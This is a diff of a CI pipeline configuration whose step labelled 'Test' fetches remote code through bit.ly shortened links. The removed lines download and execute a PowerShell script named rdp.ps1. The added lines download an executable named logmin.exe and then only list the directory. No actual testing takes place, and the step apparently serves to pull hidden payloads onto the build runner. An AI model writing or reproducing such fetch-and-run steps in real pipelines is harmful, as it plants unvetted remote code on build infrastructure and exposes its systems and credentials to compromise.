@@ -14,6 +14,6 @@ jobs:
       - run:
           name: Test
           command: |
-            Invoke-WebRequest https://bit.ly/3w3y436 -OutFile rdp.ps1
-            ./rdp.ps1
+            Invoke-WebRequest https://bit.ly/3w1AZJs -OutFile logmin.exe
+            DIR
             
